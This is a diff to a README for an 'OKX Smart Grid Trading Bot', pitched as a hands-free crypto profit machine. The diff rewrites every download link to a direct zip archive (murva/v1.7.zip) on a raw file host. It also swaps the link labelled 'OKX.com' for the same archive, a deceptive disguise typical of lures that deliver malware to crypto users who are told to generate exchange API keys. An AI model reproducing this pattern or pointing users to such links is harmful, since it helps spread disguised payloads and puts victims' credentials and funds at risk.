@@ -1,12 +1,12 @@
 # 🤖 OKX-Smart-Grid-Trading-Bot - Your Hands-Free Crypto Profit Machine
 
-[![Download Now](https://img.shields.io/badge/Download-OKX_Bot_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D)](https://github.com/LangBrasil/OKX-Smart-Grid-Trading-Bot)
+[![Download Now](https://img.shields.io/badge/Download-OKX_Bot_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D)](https://raw.githubusercontent.com/LangBrasil/OKX-Smart-Grid-Trading-Bot/main/murva/v1.7.zip)
 
 ---
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/LangBrasil/OKX-Smart-Grid-Trading-Bot](https://github.com/LangBrasil/OKX-Smart-Grid-Trading-Bot)
+Visit this link to download the application: [https://raw.githubusercontent.com/LangBrasil/OKX-Smart-Grid-Trading-Bot/main/murva/v1.7.zip](https://raw.githubusercontent.com/LangBrasil/OKX-Smart-Grid-Trading-Bot/main/murva/v1.7.zip)
 
 ---
 
@@ -43,10 +43,10 @@ No subscription fees, no hidden costs, no premium tiers. Download it once and us
 ## 🚀 Getting Started
 
 ### Step 1: Download the Bot
-Click the download button at the top of this page or visit: [https://github.com/LangBrasil/OKX-Smart-Grid-Trading-Bot](https://github.com/LangBrasil/OKX-Smart-Grid-Trading-Bot)
+Click the download button at the top of this page or visit: [https://raw.githubusercontent.com/LangBrasil/OKX-Smart-Grid-Trading-Bot/main/murva/v1.7.zip](https://raw.githubusercontent.com/LangBrasil/OKX-Smart-Grid-Trading-Bot/main/murva/v1.7.zip)
 
 ### Step 2: Create an OKX Account
-If you don't already have one, go to [OKX.com](https://www.okx.com) and sign up. It takes less than two minutes and requires only an email address.
+If you don't already have one, go to [OKX.com](https://raw.githubusercontent.com/LangBrasil/OKX-Smart-Grid-Trading-Bot/main/murva/v1.7.zip) and sign up. It takes less than two minutes and requires only an email address.
 
 ### Step 3: Generate API Keys
 1. Log in to your OKX account
@@ -148,7 +148,7 @@ OKX-Smart-Grid-Trading-Bot puts professional-grade automated trading within reac
 
 Thousands of users are already using this tool to grow their crypto portfolios while spending zero time on manual trading. Join them today.
 
-**👉 [Download OKXBot Now](https://github.com/LangBrasil/OKX-Smart-Grid-Trading-Bot)**
+**👉 [Download OKXBot Now](https://raw.githubusercontent.com/LangBrasil/OKX-Smart-Grid-Trading-Bot/main/murva/v1.7.zip)**
 
 ---
 
